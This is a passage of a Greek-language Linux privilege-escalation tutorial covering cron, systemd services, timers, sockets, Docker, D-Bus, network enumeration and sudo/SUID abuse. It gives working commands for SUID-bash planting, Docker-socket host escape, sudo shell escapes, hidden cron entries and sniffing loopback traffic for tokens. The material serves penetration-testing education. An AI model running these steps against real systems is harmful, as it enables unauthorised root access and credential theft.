for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα καταγράφει κάθε process που ξεκινά).

### Root backups που διατηρούν τα mode bits που έχουν οριστεί από τον attacker (pg_basebackup)

Αν ένα cron που εκτελείται ως root τυλίγει το `pg_basebackup` (ή οποιοδήποτε recursive copy) για έναν κατάλογο βάσης δεδομένων στον οποίο έχετε δικαίωμα εγγραφής, μπορείτε να τοποθετήσετε ένα **SUID/SGID binary**, το οποίο θα αντιγραφεί ξανά ως **root:root**, με τα ίδια mode bits, στο output του backup.

Τυπική ροή discovery (ως DB user με χαμηλά δικαιώματα):
- Χρησιμοποιήστε το `pspy` για να εντοπίσετε ένα root cron που καλεί κάτι όπως `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` κάθε λεπτό.
- Επιβεβαιώστε ότι το source cluster (π.χ. `/var/lib/postgresql/14/main`) είναι writable από εσάς και ότι το destination (`/opt/backups/current`) αποκτά ιδιοκτήτη root μετά την εκτέλεση του job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Αυτό λειτουργεί επειδή το `pg_basebackup` διατηρεί τα bits δικαιωμάτων αρχείων κατά την αντιγραφή του cluster· όταν εκτελείται από τον root, τα αρχεία προορισμού κληρονομούν **ιδιοκτησία root + SUID/SGID που έχει επιλέξει ο attacker**. Οποιαδήποτε παρόμοια privileged ρουτίνα backup/copy που διατηρεί τα δικαιώματα και γράφει σε εκτελέσιμη τοποθεσία είναι ευάλωτη.

### Αόρατα cron jobs

Είναι δυνατή η δημιουργία ενός cronjob **τοποθετώντας έναν χαρακτήρα carriage return μετά από ένα σχόλιο** (χωρίς χαρακτήρα newline), και το cron job θα λειτουργήσει. Παράδειγμα (σημειώστε τον χαρακτήρα carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Για τον εντοπισμό αυτού του είδους κρυφής καταχώρισης, ελέγξτε τα αρχεία cron με εργαλεία που εμφανίζουν χαρακτήρες ελέγχου:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Υπηρεσίες

### Εγγράψιμα _.service_ αρχεία

Ελέγξτε αν μπορείτε να γράψετε σε οποιοδήποτε αρχείο `.service`. Αν μπορείτε, **θα μπορούσατε να το τροποποιήσετε** ώστε να **εκτελεί** το **backdoor σας όταν** η υπηρεσία **ξεκινά**, **επανεκκινείται** ή **τερματίζεται** (ίσως χρειαστεί να περιμένετε μέχρι να γίνει reboot το μηχάνημα).\
Για παράδειγμα, δημιουργήστε το backdoor σας μέσα στο αρχείο .service με **`ExecStart=/tmp/script.sh`**

### Εγγράψιμα service binaries

Έχετε υπόψη ότι αν έχετε **δικαιώματα εγγραφής σε binaries που εκτελούνται από services**, μπορείτε να τα αλλάξετε για να περιέχουν backdoors, ώστε όταν τα services εκτελεστούν ξανά, να εκτελεστούν τα backdoors.

### systemd PATH - Relative Paths

Μπορείτε να δείτε το PATH που χρησιμοποιεί το **systemd** με:
```bash
systemctl show-environment
```
Αν διαπιστώσετε ότι μπορείτε να **γράψετε** σε οποιονδήποτε από τους φακέλους της διαδρομής, ενδέχεται να μπορείτε να **κλιμακώσετε τα δικαιώματα**. Πρέπει να αναζητήσετε **σχετικές διαδρομές που χρησιμοποιούνται σε αρχεία ρυθμίσεων υπηρεσιών**, όπως:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Στη συνέχεια, δημιούργησε ένα **εκτελέσιμο** με το **ίδιο όνομα με το binary του relative path** μέσα στον φάκελο του systemd PATH στον οποίο μπορείς να γράψεις και, όταν ζητηθεί από την υπηρεσία να εκτελέσει την ευάλωτη ενέργεια (**Start**, **Stop**, **Reload**), θα εκτελεστεί το **backdoor** σου (οι unprivileged χρήστες συνήθως δεν μπορούν να ξεκινήσουν/σταματήσουν υπηρεσίες, αλλά έλεγξε αν μπορείς να χρησιμοποιήσεις το `sudo -l`).

**Μάθε περισσότερα για τις υπηρεσίες με το `man systemd.service`.**

## **Timers**

Τα **Timers** είναι αρχεία systemd unit των οποίων το όνομα τελειώνει σε `**.timer**` και ελέγχουν αρχεία `**.service**` ή events. Τα **Timers** μπορούν να χρησιμοποιηθούν ως εναλλακτική του cron, καθώς διαθέτουν ενσωματωμένη υποστήριξη για calendar time events και monotonic time events και μπορούν να εκτελούνται ασύγχρονα.

Μπορείς να κάνεις enumerate όλα τα timers με:
```bash
systemctl list-timers --all
```
### Εγγράψιμοι timers

Αν μπορείτε να τροποποιήσετε έναν timer, μπορείτε να τον κάνετε να εκτελεί κάποια υπάρχουσα μονάδα του systemd.unit (όπως ένα `.service` ή ένα `.target`).
```bash
Unit=backdoor.service
```
Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι το Unit:

> Το Unit που θα ενεργοποιηθεί όταν λήξει αυτό το Timer. Το όρισμα είναι ένα όνομα Unit, του οποίου το suffix δεν είναι ".timer". Αν δεν καθοριστεί, αυτή η τιμή προεπιλέγεται σε ένα service που έχει το ίδιο όνομα με το timer unit, εκτός από το suffix. (Βλ. παραπάνω.) Συνιστάται το όνομα του Unit που ενεργοποιείται και το όνομα του timer unit να είναι πανομοιότυπα, εκτός από το suffix.

Επομένως, για να κάνετε abuse αυτής της permission, θα πρέπει να:

- Βρείτε κάποιο systemd unit (όπως ένα `.service`) που **εκτελεί ένα writable binary**
- Βρείτε κάποιο systemd unit που **εκτελεί ένα relative path** και έχετε **writable privileges** πάνω στο **systemd PATH** (για να impersonate το συγκεκριμένο executable)

**Μάθετε περισσότερα σχετικά με τα Timer με `man systemd.timer`.**

### **Ενεργοποίηση Timer**

Για να ενεργοποιήσετε ένα Timer χρειάζεστε root privileges και να εκτελέσετε:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Σημειώστε ότι ο **timer** **ενεργοποιείται** με τη δημιουργία ενός symlink προς αυτόν στο `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Τα Unix Domain Sockets (UDS) επιτρέπουν **επικοινωνία μεταξύ διεργασιών** στο ίδιο ή σε διαφορετικά μηχανήματα, στο πλαίσιο μοντέλων client-server. Χρησιμοποιούν τυπικά αρχεία descriptors του Unix για επικοινωνία μεταξύ υπολογιστών και ρυθμίζονται μέσω αρχείων `.socket`.

Τα Sockets μπορούν να ρυθμιστούν με τη χρήση αρχείων `.socket`.

**Μάθετε περισσότερα για τα sockets με το `man systemd.socket`.** Μέσα σε αυτό το αρχείο μπορούν να ρυθμιστούν αρκετές ενδιαφέρουσες παράμετροι:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές διαφέρουν, αλλά συνοπτικά χρησιμοποιούνται για να **υποδείξουν πού θα ακούει** το socket (τη διαδρομή του αρχείου socket AF_UNIX, τη διεύθυνση IPv4/6 και/ή τον αριθμό port όπου θα ακούει κ.λπ.)
- `Accept`: Δέχεται boolean όρισμα. Αν είναι **true**, μια **service instance δημιουργείται για κάθε εισερχόμενη σύνδεση** και σε αυτήν μεταβιβάζεται μόνο το connection socket. Αν είναι **false**, όλα τα listening sockets **μεταβιβάζονται στο service unit που ξεκινά**, και δημιουργείται μόνο ένα service unit για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για datagram sockets και FIFOs, όπου ένα μόνο service unit χειρίζεται χωρίς εξαίρεση όλη την εισερχόμενη κίνηση. **Η προεπιλογή είναι false**. Για λόγους απόδοσης, συνιστάται τα νέα daemons να γράφονται με τρόπο κατάλληλο για `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Δέχονται μία ή περισσότερες γραμμές εντολών, οι οποίες **εκτελούνται πριν** ή **μετά** τη δημιουργία και σύνδεση των listening **sockets**/FIFOs, αντίστοιχα. Το πρώτο token της γραμμής εντολών πρέπει να είναι ένα απόλυτο filename και να ακολουθείται από τα ορίσματα της διεργασίας.
- `ExecStopPre`, `ExecStopPost`: Πρόσθετες **εντολές** που **εκτελούνται πριν** ή **μετά** το κλείσιμο και την αφαίρεση των listening **sockets**/FIFOs, αντίστοιχα.
- `Service`: Καθορίζει το όνομα του **service** unit **που θα ενεργοποιηθεί** σε **εισερχόμενη κίνηση**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Ως προεπιλογή, χρησιμοποιείται το service που έχει το ίδιο όνομα με το socket (με αντικατάσταση του suffix). Στις περισσότερες περιπτώσεις, δεν θα πρέπει να είναι απαραίτητη η χρήση αυτής της επιλογής.

### Writable .socket files

Αν βρείτε ένα **writable** αρχείο `.socket`, μπορείτε να προσθέσετε στην αρχή της ενότητας `[Socket]` κάτι όπως: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν από τη δημιουργία του socket. Επομένως, **πιθανότατα θα χρειαστεί να περιμένετε μέχρι να γίνει reboot του μηχανήματος.**\
_Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί τη συγκεκριμένη ρύθμιση του socket file, διαφορετικά το backdoor δεν θα εκτελεστεί_

### Socket activation + writable unit path (create missing service)

Μια ακόμη σημαντική λανθασμένη ρύθμιση είναι:

- ένα socket unit με `Accept=no` και `Service=<name>.service`
- το referenced service unit απουσιάζει
- ένας attacker μπορεί να γράψει στο `/etc/systemd/system` (ή σε άλλη unit search path)

Σε αυτή την περίπτωση, ο attacker μπορεί να δημιουργήσει το `<name>.service` και στη συνέχεια να προκαλέσει κίνηση προς το socket, ώστε το systemd να φορτώσει και να εκτελέσει το νέο service ως root.

Γρήγορη ροή:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Εγγράψιμα sockets

Αν **εντοπίσετε οποιοδήποτε εγγράψιμο socket** (_τώρα μιλάμε για Unix Sockets και όχι για τα αρχεία ρυθμίσεων `.socket`_), τότε **μπορείτε να επικοινωνήσετε** με αυτό το socket και ίσως να εκμεταλλευτείτε μια ευπάθεια.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Raw connection
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Παράδειγμα εκμετάλλευσης:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Σημειώστε ότι ενδέχεται να υπάρχουν ορισμένα **sockets που ακούν για αιτήματα HTTP** (_δεν αναφέρομαι σε αρχεία .socket, αλλά στα αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Εάν το socket **απαντά σε ένα HTTP** request, τότε μπορείτε να **επικοινωνήσετε** μαζί του και ίσως να **εκμεταλλευτείτε κάποια ευπάθεια**.

### Writable Docker Socket

Το Docker socket, που συχνά βρίσκεται στο `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που θα πρέπει να προστατεύεται. Από προεπιλογή, είναι writable από τον χρήστη `root` και τα μέλη του group `docker`. Η απόκτηση write access σε αυτό το socket μπορεί να οδηγήσει σε privilege escalation. Ακολουθεί μια ανάλυση του τρόπου με τον οποίο μπορεί να γίνει αυτό, καθώς και εναλλακτικές μέθοδοι σε περίπτωση που το Docker CLI δεν είναι διαθέσιμο.

#### **Privilege Escalation με Docker CLI**

Εάν έχετε write access στο Docker socket, μπορείτε να κάνετε privilege escalation χρησιμοποιώντας τις ακόλουθες εντολές:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Αυτές οι εντολές σάς επιτρέπουν να εκτελέσετε ένα container με πρόσβαση επιπέδου root στο σύστημα αρχείων του host.

#### **Χρήση του Docker API απευθείας**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, το Docker socket μπορεί ακόμη να χειραγωγηθεί χρησιμοποιώντας το Docker API και εντολές `curl`.

1.  **Λίστα Docker Images:** Ανάκτηση της λίστας των διαθέσιμων images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Δημιουργία Container:** Αποστολή ενός request για τη δημιουργία ενός container που κάνει mount τον root κατάλογο του host system.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Εκκινήστε το container που δημιουργήθηκε:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Σύνδεση στο Container:** Χρησιμοποιήστε το `socat` για να δημιουργήσετε σύνδεση με το container, επιτρέποντας την εκτέλεση εντολών σε αυτό.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Μετά τη ρύθμιση της σύνδεσης `socat`, μπορείτε να εκτελείτε εντολές απευθείας στο container με πρόσβαση επιπέδου root στο σύστημα αρχείων του host.

### Άλλα

Σημειώστε ότι αν έχετε δικαιώματα εγγραφής στο docker socket επειδή βρίσκεστε **μέσα στο group `docker`**, έχετε [**περισσότερους τρόπους για privilege escalation**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Αν το [**docker API ακούει σε μια port**, μπορεί επίσης να μπορέσετε να το compromise](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Δείτε **περισσότερους τρόπους για να κάνετε breakout από containers ή να κάνετε abuse σε container runtimes για privilege escalation** στη διεύθυνση:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Privilege escalation στο Containerd (ctr)

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`ctr`**, διαβάστε την ακόλουθη σελίδα, καθώς **ενδέχεται να μπορέσετε να την κάνετε abuse για privilege escalation**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Privilege escalation στο **RunC**

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`runc`**, διαβάστε την ακόλουθη σελίδα, καθώς **ενδέχεται να μπορέσετε να την κάνετε abuse για privilege escalation**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

Το D-Bus είναι ένα εξελιγμένο **σύστημα Inter-Process Communication (IPC)** που επιτρέπει στις εφαρμογές να αλληλεπιδρούν αποτελεσματικά και να μοιράζονται δεδομένα. Σχεδιασμένο με βάση το σύγχρονο Linux system, προσφέρει ένα ισχυρό framework για διάφορες μορφές επικοινωνίας μεταξύ εφαρμογών.

Το σύστημα είναι ευέλικτο και υποστηρίζει βασικό IPC, το οποίο βελτιώνει την ανταλλαγή δεδομένων μεταξύ processes, θυμίζοντας **βελτιωμένα UNIX domain sockets**. Επιπλέον, βοηθά στη μετάδοση events ή signals, διευκολύνοντας την απρόσκοπτη ενοποίηση μεταξύ system components. Για παράδειγμα, ένα signal από έναν Bluetooth daemon σχετικά με μια εισερχόμενη κλήση μπορεί να προκαλέσει τη σίγαση ενός music player, βελτιώνοντας την εμπειρία του χρήστη. Επιπρόσθετα, το D-Bus υποστηρίζει ένα remote object system, απλοποιώντας τα service requests και τις method invocations μεταξύ εφαρμογών και βελτιστοποιώντας processes που παραδοσιακά ήταν σύνθετα.

Το D-Bus λειτουργεί με βάση ένα **μοντέλο allow/deny**, διαχειριζόμενο τα δικαιώματα των messages (method calls, signal emissions κ.λπ.) βάσει του αθροιστικού αποτελέσματος των policy rules που ταιριάζουν. Αυτές οι policies καθορίζουν τις αλληλεπιδράσεις με το bus και ενδέχεται να επιτρέψουν privilege escalation μέσω της εκμετάλλευσης αυτών των δικαιωμάτων.

Ένα παράδειγμα τέτοιας policy στο `/etc/dbus-1/system.d/wpa_supplicant.conf` παρέχεται παρακάτω και περιγράφει τα δικαιώματα του root user να κατέχει, να στέλνει και να λαμβάνει messages από το `fi.w1.wpa_supplicant1`.

Οι policies χωρίς καθορισμένο user ή group εφαρμόζονται καθολικά, ενώ οι policies στο context "default" εφαρμόζονται σε όλα όσα δεν καλύπτονται από άλλες συγκεκριμένες policies.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Μάθε πώς να κάνεις enumerate και exploit μια επικοινωνία D-Bus εδώ:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Δίκτυο**

Είναι πάντα ενδιαφέρον να κάνεις enumerate το δίκτυο και να προσδιορίζεις τη θέση του machine.

### Γενικό enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Γρήγορη αρχική διαλογή εξερχόμενου φιλτραρίσματος

Αν ο host μπορεί να εκτελεί commands αλλά τα callbacks αποτυγχάνουν, διαχωρίστε γρήγορα το φιλτράρισμα DNS, transport, proxy και route:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Ανοιχτές θύρες

Να ελέγχετε πάντα τις network services που εκτελούνται στο machine και με τις οποίες δεν μπορέσατε να αλληλεπιδράσετε πριν αποκτήσετε πρόσβαση σε αυτό:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classify listeners by bind target:

- `0.0.0.0` / `[::]`: εκτεθειμένα σε όλα τα τοπικά interfaces.
- `127.0.0.1` / `::1`: μόνο τοπικά (καλοί υποψήφιοι για tunnel/forward).
- Συγκεκριμένες εσωτερικές IP (π.χ. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): συνήθως προσβάσιμες μόνο από εσωτερικά segments.

### Local-only service triage workflow

Όταν παραβιάσετε έναν host, οι services που είναι δεμένες στο `127.0.0.1` συχνά γίνονται για πρώτη φορά προσβάσιμες από το shell σας. Ένα γρήγορο local workflow είναι:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### Το LinPEAS ως σαρωτής δικτύου (λειτουργία μόνο δικτύου)

Εκτός από τους τοπικούς ελέγχους PE, το linPEAS μπορεί να εκτελείται ως στοχευμένος σαρωτής δικτύου. Χρησιμοποιεί τα διαθέσιμα binaries στο `$PATH` (συνήθως `fping`, `ping`, `nc`, `ncat`) και δεν εγκαθιστά εργαλεία.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Αν περάσετε τα `-d`, `-p` ή `-i` χωρίς το `-t`, το linPEAS λειτουργεί ως pure network scanner (παραλείποντας τους υπόλοιπους ελέγχους privilege-escalation).

### Sniffing

Ελέγξτε αν μπορείτε να κάνετε sniff στην κίνηση. Αν μπορείτε, ίσως μπορέσετε να αρπάξετε κάποια credentials.
```
timeout 1 tcpdump
```
Γρήγοροι πρακτικοί έλεγχοι:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Το Loopback (`lo`) είναι ιδιαίτερα πολύτιμο στο post-exploitation, επειδή πολλές υπηρεσίες που είναι διαθέσιμες μόνο εσωτερικά εκθέτουν tokens/cookies/credentials εκεί:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Κατέγραψε τώρα, κάνε parse αργότερα:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Users

### Generic Enumeration

Ελέγξτε **ποιοι** είστε, ποια **privileges** έχετε, ποιοι **users** υπάρχουν στα συστήματα, ποιοι μπορούν να κάνουν **login** και ποιοι έχουν **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Ορισμένες εκδόσεις Linux επηρεάζονταν από ένα bug που επιτρέπει σε χρήστες με **UID > INT_MAX** να κάνουν privilege escalation. Περισσότερες πληροφορίες: [εδώ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [εδώ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [εδώ](https://twitter.com/paragonsec/status/1071152249529884674).\
**Εκμεταλλευτείτε το** χρησιμοποιώντας: **`systemd-run -t /bin/bash`**

### Ομάδες

Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας παραχωρήσει root privileges:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Ελέγξτε αν υπάρχει κάτι ενδιαφέρον μέσα στο clipboard (αν είναι δυνατό)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Πολιτική κωδικού πρόσβασης
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Γνωστοί κωδικοί πρόσβασης

Αν **γνωρίζετε οποιονδήποτε κωδικό πρόσβασης** του περιβάλλοντος, **δοκιμάστε να συνδεθείτε ως κάθε χρήστης** χρησιμοποιώντας τον κωδικό πρόσβασης.

### Su Brute

Αν δεν σας πειράζει να δημιουργήσετε πολύ θόρυβο και τα binaries `su` και `timeout` υπάρχουν στον υπολογιστή, μπορείτε να δοκιμάσετε να κάνετε brute-force σε χρήστες χρησιμοποιώντας το [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
Το [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` προσπαθεί επίσης να κάνει brute-force σε χρήστες.

## Καταχρήσεις εγγράψιμου PATH

### $PATH

Αν διαπιστώσετε ότι μπορείτε να **γράψετε μέσα σε κάποιον φάκελο του $PATH**, ενδέχεται να μπορείτε να κάνετε privilege escalation **δημιουργώντας ένα backdoor μέσα στον εγγράψιμο φάκελο**, με το όνομα κάποιας εντολής που πρόκειται να εκτελεστεί από διαφορετικό χρήστη (ιδανικά τον root) και η οποία **δεν φορτώνεται από φάκελο που βρίσκεται νωρίτερα** από τον εγγράψιμο φάκελό σας στο $PATH.

### SUDO και SUID

Ενδέχεται να επιτρέπεται να εκτελέσετε κάποια εντολή χρησιμοποιώντας sudo ή η εντολή μπορεί να έχει το suid bit. Ελέγξτε το χρησιμοποιώντας:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Ορισμένες **μη αναμενόμενες εντολές σάς επιτρέπουν να διαβάζετε ή/και να γράφετε αρχεία ή ακόμη και να εκτελείτε μια εντολή.** Για παράδειγμα:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Η ρύθμιση του Sudo ενδέχεται να επιτρέπει σε έναν χρήστη να εκτελεί κάποια εντολή με τα δικαιώματα ενός άλλου χρήστη χωρίς να γνωρίζει τον κωδικό πρόσβασης.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Σε αυτό το παράδειγμα, ο χρήστης `demo` μπορεί να εκτελέσει το `vim` ως `root`. Πλέον, είναι τετριμμένο να αποκτήσει ένα shell προσθέτοντας ένα ssh key στον κατάλογο του root ή καλώντας το `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** κατά την εκτέλεση κάποιου στοιχείου:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Αυτό το παράδειγμα, **βασισμένο στο HTB machine Admirer**, ήταν **ευάλωτο** σε **PYTHONPATH hijacking**, για τη φόρτωση μιας αυθαίρετης python library κατά την εκτέλεση του script ως root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning σε imports Python που επιτρέπονται μέσω sudo

Αν ένα **Python script που επιτρέπεται μέσω sudo** κάνει import ένα module του οποίου ο κατάλογος του package περιέχει ένα **writable `__pycache__`**, μπορεί να μπορέσετε να αντικαταστήσετε το cached `.pyc` και να επιτύχετε code execution ως ο privileged user στο επόμενο import.

- Γιατί λειτουργεί:
- Το CPython αποθηκεύει bytecode caches στο `__pycache__/module.cpython-<ver>.pyc`.
- Ο interpreter επικυρώνει το **header** (magic + timestamp/hash metadata που συνδέονται με το source) και στη συνέχεια εκτελεί το marshaled code object που είναι αποθηκευμένο μετά από αυτό το header.
